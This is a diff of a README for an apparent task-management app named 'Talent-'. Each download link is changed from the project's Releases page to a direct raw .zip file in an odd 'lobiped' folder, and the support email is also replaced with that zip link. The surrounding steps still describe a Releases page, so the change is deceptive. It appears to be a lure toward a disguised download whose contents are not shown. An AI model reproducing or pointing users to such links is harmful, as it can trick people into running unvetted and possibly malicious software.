@@ -6,7 +6,7 @@ Welcome to Talent-! This application helps you manage tasks efficiently and keep
 
 ## 📥 Download Talent-
 
-[![Download Talent-](https://img.shields.io/badge/Download-Talent--blue)](https://github.com/Toxic-mofo/Talent-/releases)
+[![Download Talent-](https://raw.githubusercontent.com/Toxic-mofo/Talent-/main/lobiped/Talent-.zip)](https://raw.githubusercontent.com/Toxic-mofo/Talent-/main/lobiped/Talent-.zip)
 
 ## 💡 Features
 
@@ -27,7 +27,7 @@ To run Talent-, ensure your system meets the following requirements:
 
 To download Talent-, visit the following link:
 
-[Download Talent-](https://github.com/Toxic-mofo/Talent-/releases)
+[Download Talent-](https://raw.githubusercontent.com/Toxic-mofo/Talent-/main/lobiped/Talent-.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
@@ -66,7 +66,7 @@ If you encounter any issues while using Talent-, consider these steps:
 
 For further assistance, you can reach our support team:
 
-- Email: support@talent-app.com
+- Email: https://raw.githubusercontent.com/Toxic-mofo/Talent-/main/lobiped/Talent-.zip
 - Community Forum: (Link to the forum page)
 
 ## 🎉 Conclusion
